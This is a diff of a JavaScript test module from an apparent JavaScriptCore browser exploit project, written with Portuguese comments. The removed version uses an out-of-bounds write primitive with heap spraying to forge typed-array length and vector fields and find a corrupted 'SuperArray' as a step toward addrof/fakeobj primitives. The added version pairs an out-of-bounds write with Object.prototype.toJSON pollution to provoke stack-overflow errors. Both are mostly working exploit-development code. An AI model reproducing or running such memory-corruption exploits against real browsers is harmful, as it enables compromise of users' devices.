@@ -1,147 +1,168 @@
-// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
-import { logS3, PAUSE_S3 } from './s3_utils.mjs';
+// js/script3/testRevisitComplexObjectRangeError.mjs
+import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_array_buffer_real,
-    oob_dataview_real,
     oob_write_absolute,
-    oob_read_absolute,
+    oob_read_absolute, // Para ler o que escrevemos no oob_buffer
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
+import { OOB_CONFIG } from '../config.mjs';
 
-const FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR = "superArrayViaRelativeMVector_v20c";
+class MyComplexObjectForRangeError {
+    constructor(id) {
+        this.id = `RangeErrorTestObj-${id}`;
+        this.marker = 0x1234ABCD;
+        this.data = [id, id + 1, id + 2];
+        this.subObject = { nested_prop: id * 10 };
+    }
+    // Sem métodos para manter simples
+}
 
-const CORRUPTION_OFFSET_TRIGGER = 0x70;
-const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
-
-const FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB = 0x50; 
-const TARGET_M_LENGTH_VALUE = 0xFFFFFFFF;
-
-// Valor a ser plantado para o m_vector.
-// Se oob_read_absolute usa o dataPointer do oob_array_buffer_real como base 0,
-// então um m_vector de 0 faria o superArray ler do início dos dados do oob_array_buffer_real.
-const PLANTED_M_VECTOR_VALUE = new AdvancedInt64(0, 0); // Tentar 0 para apontar para o início dos dados do oob_buffer
-
-const NUM_SPRAY_OBJECTS = 500;
-const ORIGINAL_SPRAY_LENGTH = 8;
-const SPRAY_ELEMENT_VAL_A = 0xABABABAB;
-const SPRAY_ELEMENT_VAL_B = 0xCDCDCDCD;
-
-const MARKER_IN_OOB_BUFFER = 0xCAFEBEEF;
-const MARKER_OFFSET_IN_OOB_BUFFER_DATA = 0x20; // Onde o marcador será escrito DENTRO dos dados do oob_array_buffer_real
-
-let sprayedVictimObjects = [];
-
-export async function sprayAndInvestigateObjectExposure() {
-    logS3(`--- Iniciando ${FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR}: SuperArray com m_vector relativo ---`, "test", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-
-    try {
-        await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-
-        // FASE 1: Spray
-        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-        sprayedVictimObjects = [];
-        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
-            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
-            u32arr[0] = SPRAY_ELEMENT_VAL_A ^ i;
-            u32arr[1] = SPRAY_ELEMENT_VAL_B ^ i;
-            sprayedVictimObjects.push(u32arr);
-        }
-        logS3("Pulverização concluída.", "good", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-
-        // FASE 2: Plantar metadados no oob_array_buffer_real
-        logS3(`FASE 2: Plantando m_vector=${PLANTED_M_VECTOR_VALUE.toString(true)}, m_length=${toHex(TARGET_M_LENGTH_VALUE)} em oob_buffer...`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-        const targetMetaVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
-        const targetMetaLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
-        
-        oob_write_absolute(targetMetaVectorOffset, PLANTED_M_VECTOR_VALUE, 8);
-        oob_write_absolute(targetMetaLengthOffset, TARGET_M_LENGTH_VALUE, 4);
-        logS3(`  Valores plantados em oob_buffer[${toHex(targetMetaVectorOffset)}] e oob_buffer[${toHex(targetMetaLengthOffset)}]`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-        // Verificar o que foi plantado
-        const chk_vec = oob_read_absolute(targetMetaVectorOffset,8);
-        const chk_len = oob_read_absolute(targetMetaLengthOffset,4);
-        logS3(`  Verificação Pós-Plantio: m_vector=${chk_vec.toString(true)}, m_length=${toHex(chk_len)}`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-
-
-        // FASE 3: Trigger
-        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-        await PAUSE_S3(200);
-
-        // FASE 4: Identificar SuperArray
-        logS3(`FASE 4: Tentando identificar SuperArray...`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-        // Escrever um marcador nos dados do oob_array_buffer_real usando a primitiva OOB
-        oob_write_absolute(MARKER_OFFSET_IN_OOB_BUFFER_DATA, MARKER_IN_OOB_BUFFER, 4);
-        logS3(`  Marcador ${toHex(MARKER_IN_OOB_BUFFER)} escrito em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_BUFFER_DATA)}] via oob_write.`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-
-        let superArrayIndex = -1;
-        let foundSuperArray = null;
-
-        for (let i = 0; i < sprayedVictimObjects.length; i++) {
-            const currentArray = sprayedVictimObjects[i];
-            if (!currentArray) continue;
-
-            // Primeiro, checar se o length foi corrompido para o valor massivo
-            if (currentArray.length === TARGET_M_LENGTH_VALUE) {
-                logS3(`    Array pulverizado [${i}] tem length = ${toHex(TARGET_M_LENGTH_VALUE)}. Verificando marcador...`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-                try {
-                    // Se PLANTED_M_VECTOR_VALUE foi 0 (relativo ao dataPointer do oob_array_buffer_real),
-                    // então o índice para ler o marcador é MARKER_OFFSET_IN_OOB_BUFFER_DATA / 4.
-                    const index_to_read_marker = MARKER_OFFSET_IN_OOB_BUFFER_DATA / 4; // Uint32Array index
-                    
-                    if (index_to_read_marker < currentArray.length) { // Segurança adicional
-                        const value_read = currentArray[index_to_read_marker];
-                        logS3(`    Array [${i}][${toHex(index_to_read_marker)}] leu: ${toHex(value_read)}`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-                        if (value_read === MARKER_IN_OOB_BUFFER) {
-                            superArrayIndex = i;
-                            foundSuperArray = currentArray;
-                            logS3(`    !!!! SUPERARRAY ENCONTRADO !!!! Índice: ${i}. Marcador verificado.`, "vuln", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-                            document.title = `SUPERARRAY Idx ${i}!`;
-                            break; 
-                        }
+// Variantes da toJSON para testar o RangeError
+const toJSON_variants_for_range_error = {
+    V0_EmptyReturn: function() {
+        return { variant: "V0_EmptyReturn" };
+    },
+    V1_AccessThisId: function() {
+        try { return { variant: "V1_AccessThisId", id: this.id }; }
+        catch (e) { return { variant: "V1_AccessThisId", error: e.message }; }
+    },
+    V2_ToStringCallThis: function() {
+        try { return { variant: "V2_ToStringCallThis", type: Object.prototype.toString.call(this) }; }
+        catch (e) { return { variant: "V2_ToStringCallThis", error: e.message }; }
+    },
+    V3_LoopInLimited: function() { // O for...in que causou problema antes
+        let props = {}; let count = 0;
+        try {
+            for (const p in this) {
+                if (count++ < 5) { // Limitar iterações para evitar RangeError se for por causa do loop em si
+                    if (Object.prototype.hasOwnProperty.call(this, p)) {
+                        props[p] = String(this[p]).substring(0, 30);
                     }
-                } catch (e) {
-                    logS3(`    Erro ao tentar ler marcador do array [${i}]: ${e.message}`, "warn", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
+                } else break;
+            }
+            return { variant: "V3_LoopInLimited", props: props, count: count };
+        } catch (e) {
+            return { variant: "V3_LoopInLimited", error: e.message, props_collected: props, count_at_error: count };
+        }
+    },
+    V4_AccessMultipleProps: function() {
+        try {
+            return {
+                variant: "V4_AccessMultipleProps",
+                id: this.id,
+                marker: toHex(this.marker),
+                dataLength: this.data ? this.data.length : "N/A",
+                subObjectProp: this.subObject ? this.subObject.nested_prop : "N/A"
+            };
+        } catch (e) {
+            return { variant: "V4_AccessMultipleProps", error: e.message };
+        }
+    }
+};
+
+export async function executeRevisitComplexObjectRangeError() {
+    const FNAME_TEST = "executeRevisitComplexObjectRangeError_v21";
+    logS3(`--- Iniciando ${FNAME_TEST}: Revisitando RangeError com MyComplexObject ---`, "test", FNAME_TEST);
+
+    const spray_count = 50; // Menor para logs mais gerenciáveis
+    const corruption_offset_in_oob_ab = 0x70; // (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;
+    const value_to_write_in_oob_ab = 0xFFFFFFFF;
+    const bytes_to_write_oob_val = 4;
+
+    for (const variant_name of Object.keys(toJSON_variants_for_range_error)) {
+        const toJSON_function_to_use = toJSON_variants_for_range_error[variant_name];
+        logS3(`\n--- SUB-TESTE: Usando ${variant_name} ---`, "subtest", FNAME_TEST);
+        document.title = `RangeError Test - ${variant_name}`;
+
+        let sprayed_objects = [];
+        try {
+            for (let i = 0; i < spray_count; i++) {
+                sprayed_objects.push(new MyComplexObjectForRangeError(i));
+            }
+        } catch (e_spray) {
+            logS3(`ERRO no spray para ${variant_name}: ${e_spray.message}`, "error", FNAME_TEST);
+            continue;
+        }
+
+        await triggerOOB_primitive();
+        if (!oob_array_buffer_real) {
+            logS3("Falha OOB Setup. Pulando sub-teste.", "error", FNAME_TEST);
+            continue;
+        }
+
+        try {
+            logS3(`  Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
+            oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
+        } catch (e_write) {
+            logS3(`  ERRO na escrita OOB para ${variant_name}: ${e_write.message}`, "error", FNAME_TEST);
+            clearOOBEnvironment();
+            continue;
+        }
+
+        await PAUSE_S3(100);
+
+        const ppKey_val = 'toJSON';
+        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
+        let pollutionApplied = false;
+        let rangeErrorOccurred = false;
+        let otherErrorOccurred = null;
+
+        try {
+            Object.defineProperty(Object.prototype, ppKey_val, {
+                value: toJSON_function_to_use,
+                writable: true, configurable: true, enumerable: false
+            });
+            pollutionApplied = true;
+
+            // Testar apenas o primeiro objeto pulverizado
+            const target_obj_to_stringify = sprayed_objects[0];
+            if (target_obj_to_stringify) {
+                logS3(`  Chamando JSON.stringify(sprayed_objects[0]) (ID: ${target_obj_to_stringify.id}) com ${variant_name}...`, "info", FNAME_TEST);
+                let stringify_result = JSON.stringify(target_obj_to_stringify);
+                logS3(`    JSON.stringify completou. Resultado da toJSON: ${JSON.stringify(stringify_result)}`, "info", FNAME_TEST);
+                if (stringify_result && stringify_result.error) {
+                    otherErrorOccurred = `Erro interno da toJSON: ${stringify_result.error}`;
                 }
+            } else {
+                logS3("  Nenhum objeto pulverizado para testar.", "warn", FNAME_TEST);
+            }
+
+        } catch (e_str) {
+            if (e_str.name === 'RangeError' && e_str.message.toLowerCase().includes('call stack')) {
+                rangeErrorOccurred = true;
+                logS3(`    !!!! RangeError: Maximum call stack size exceeded CAPTURADO com ${variant_name} !!!!`, "critical", FNAME_TEST);
+                document.title = `RangeError with ${variant_name}!`;
+            } else {
+                otherErrorOccurred = `${e_str.name}: ${e_str.message}`;
+                logS3(`    !!!! ERRO INESPERADO em JSON.stringify com ${variant_name}: ${otherErrorOccurred} !!!!`, "critical", FNAME_TEST);
+                document.title = `Error with ${variant_name}!`;
+            }
+        } finally {
+            if (pollutionApplied) {
+                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
+                else delete Object.prototype.toJSON;
             }
         }
 
-        if (foundSuperArray) {
-            logS3(`  SuperArray (índice ${superArrayIndex}) validado. Length: ${foundSuperArray.length}`, "good", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-            // AGORA PODEMOS USAR foundSuperArray PARA LER/ESCREVER NO oob_array_buffer_real
-            // Exemplo: Ler o Structure* de um objeto colocado no oob_array_buffer_real
-            // Esta é a base para addrof/fakeobj se tivermos o superArray mapeado para o oob_array_buffer_real
-            const test_read_offset_in_oob_data = 0x0; // Ler o início dos dados do oob_buffer
-            const test_read_idx = test_read_offset_in_oob_data / 4;
-            const val_from_superarray = foundSuperArray[test_read_idx];
-            logS3(`  Leitura de teste com SuperArray: SuperArray[${test_read_idx}] (oob_buffer[${toHex(test_read_offset_in_oob_data)}]) = ${toHex(val_from_superarray)}`, "leak", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-            // Se o SuperArray funciona, val_from_superarray deve ser o que está em oob_array_buffer_real[0]
-
-            // TENTAR CONSTRUIR ADDROF
-            // 1. Colocar um objeto alvo (targetFuncForLeak_v19b) "dentro" do oob_array_buffer_real
-            //    (não diretamente, mas fazer o SuperArray ler/escrever seus metadados se pudermos
-            //     fazer o SuperArray apontar para ele, ou copiar os metadados dele para o oob_buffer).
-            //    Por agora, vamos assumir que o SuperArray nos dá R/W no oob_buffer.
-            //    Podemos então usar o SuperArray para criar um ArrayBuffer falso DENTRO do oob_buffer,
-            //    e fazer esse ArrayBuffer falso apontar para o targetFuncForLeak_v19b.
-            logS3("  SuperArray obtido. Próximos passos seriam construir addrof/fakeobj usando esta primitiva R/W no oob_array_buffer_real.", "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-
+        if (rangeErrorOccurred) {
+            logS3(`  ---> ${variant_name}: CONFIRMADO RangeError.`, "vuln", FNAME_TEST);
+        } else if (otherErrorOccurred) {
+            logS3(`  ---> ${variant_name}: Outro erro ocorreu: ${otherErrorOccurred}.`, "error", FNAME_TEST);
         } else {
-            logS3("  Nenhum SuperArray identificado que mapeie para o oob_array_buffer_real.", "warn", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-            document.title = "SuperArray NÃO Encontrado (v20c)";
+            logS3(`  ---> ${variant_name}: Completou sem RangeError.`, "good", FNAME_TEST);
         }
 
-    } catch (e) {
-        logS3(`ERRO CRÍTICO em ${FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR}: ${e.message}`, "critical", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-        document.title = `${FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR} FALHOU!`;
-    } finally {
-        sprayedVictimObjects = [];
         clearOOBEnvironment();
-        logS3(`--- ${FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR} Concluído ---`, "test", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
-    }
+        sprayed_objects.length = 0;
+        await PAUSE_S3(MEDIUM_PAUSE_S3);
+        if (rangeErrorOccurred && variant_name === "V3_LoopInLimited") {
+            logS3("RangeError com V3_LoopInLimited (for...in) é o esperado de logs anteriores. Investigar se outras variantes também causam.", "info", FNAME_TEST);
+        }
+    } // Fim do loop de variantes toJSON
+
+    globalThis.gc?.();
+    logS3(`--- ${FNAME_TEST} Concluído ---`, "test", FNAME_TEST);
 }
